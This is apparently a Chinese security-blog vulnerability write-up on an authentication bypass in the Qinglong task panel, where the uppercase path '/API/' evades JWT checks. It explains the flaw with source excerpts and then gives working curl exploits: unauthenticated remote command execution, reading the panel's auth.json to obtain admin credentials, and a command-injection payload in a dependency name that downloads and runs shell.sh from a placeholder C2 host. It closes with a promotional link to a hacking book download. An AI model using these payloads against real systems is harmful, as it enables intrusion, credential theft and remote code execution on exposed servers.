---
title: 青龙面板存在鉴权绕过：可获取面板账户密码、执行任意命令
url: https://mp.weixin.qq.com/s/yb0FNEOImFDp2TDqoXijgA
source: Doonsec's feed
date: 2026-02-27
fetch_date: 2026-02-28T03:57:21.823393
---

# 青龙面板存在鉴权绕过：可获取面板账户密码、执行任意命令

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/6hA1NcYVHjcx7zwN1gg4I01zoDdIVHQmRMN8y9cSlVAxAZj7pHSTLbF1oGNNaUibTrtKlr2cYFyK2yJ4w7mD2OePXnuQjdMokVglpiayFb0X4/0?wx_fmt=jpeg)

# 青龙面板存在鉴权绕过：可获取面板账户密码、执行任意命令

原创

Allen666
Allen666

Cloud Security lab

![]()

在小说阅读器中沉浸阅读

# 青龙面板存在鉴权绕过：可获取面板账户密码、执行任意命令

## 漏洞概述

近日，发现青龙面板存在严重安全漏洞。攻击者可在**绕过身份鉴权**的情况下，通过特定接口执行任意系统命令，进而获取管理员账号密码等敏感信息，对系统安全构成严重威胁。

## 漏洞详情

### 漏洞类型

* 身份认证绕过漏洞（Authentication Bypass）

### 原理分析

该漏洞源于青龙面板的身份验证机制存在缺陷，具体体现在以下代码逻辑中：

```
// back/loaders/express.ts
path: [...config.apiWhiteList, /^\/(?!api\/).*/]
```

上述正则表达式的配置存在问题。系统对API白名单的处理采用了严格的全小写匹配机制，当请求路径不以`/api/`开头时，会直接绕过JWT（JSON Web Token）校验。

进一步分析发现，自定义鉴权中间件使用了如下判断逻辑：

```
if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
  return next();
}
```

该逻辑同样采用严格的纯小写路径前缀匹配，在实际应用中存在安全隐患。

Express框架默认采用大小写不敏感的路由匹配机制。意味着`/API/`这样的路径既能绕过令牌校验，又能成功匹配到`/api/`路由，从而完全绕过所有身份验证机制。

最终，通过`app.use(config.api.prefix, routes())`的配置，攻击者可以随意调用后端API接口。

## 资产测绘

![](https://mmbiz.qpic.cn/mmbiz_png/6hA1NcYVHjce3hIDol60cvsQicQ8J99Cm2V9ds0r8nLvxJGk69MfibzeRKkIwWibQVT1cSXZq80n6wQmrWaMrvyHmQJkgtRo1zsr14vIjHZAYc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6hA1NcYVHjfJ5LdSxXwKop0XaGIP6923ovDvtmzyiaXjS5PqyKzoIRtEWpKpDe8pW67m3ebAKrwN0cnWNSjgH4qKcHOhaZ2FmDalUWOTsxF4/640?wx_fmt=png&from=appmsg)

## 漏洞验证与利用

攻击者可通过以下方式验证和利用该漏洞：

### RCE

```
curl -X PUT "http://IP:5700/API/system/command-run" -H "Content-Type: application/json" -d '{"command": "id"}'
```

### 敏感信息获取

```
curl -X PUT "http://IP:5700/API/system/command-run" -H "Content-Type: application/json" -d '{"command": "cat /ql/data/config/auth.json"}'
```

### RCE

```
curl -X POST "http://IP/API/dependencies" \
-H "Content-Type: application/json" \
-d '[{"name": "$(curl -fsSL https://C2:8000/shell.sh | sh)", "type": 0}]'
```

## 最后 公众号接入了AI & MCP，如果还有需要《GO黑帽编程》的同学直接某盘下载即可 通过XX分享的文件：Go黑帽子渗透测试编程之道.pdf 链接: https://pan.百度.com/s/1ZRezXd9e0C-KQYuapW6baQ?pwd=cr2d 提取码: cr2d

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWMQicQY13nRJibO8numvkWp8Jx8icjvvLeOeI5s6f7yHUk7Kclw4FvWGx8e9gTZez3FlnDr6sNkdbT4A/0?wx_fmt=png)

Cloud Security lab

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWMQicQY13nRJibO8numvkWp8Jx8icjvvLeOeI5s6f7yHUk7Kclw4FvWGx8e9gTZez3FlnDr6sNkdbT4A/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过